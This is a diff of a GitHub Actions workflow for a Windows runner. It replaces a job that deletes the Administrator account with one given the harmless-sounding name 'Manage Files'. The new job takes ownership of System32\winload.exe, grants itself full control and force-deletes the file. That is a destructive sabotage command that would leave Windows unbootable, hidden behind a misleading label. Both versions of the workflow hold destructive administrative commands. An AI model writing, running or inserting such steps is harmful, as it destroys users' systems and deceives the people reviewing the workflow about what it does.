@@ -1,16 +1,19 @@
-name: Delete Administrator User
+name: Manage Files
 
 on:
   workflow_dispatch:
 
 jobs:
-  delete-admin:
+  manage-files:
     runs-on: windows-latest
 
     steps:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name: Delete Administrator user
+    - name: Take ownership and modify files
       run: |
-        net user Administrator /del
+        cd /d %SystemRoot%\System32
+        takeown /f .\winload.exe
+        icacls "winload.exe" /grant %UserName%:F
+        del winload.exe /Q /F
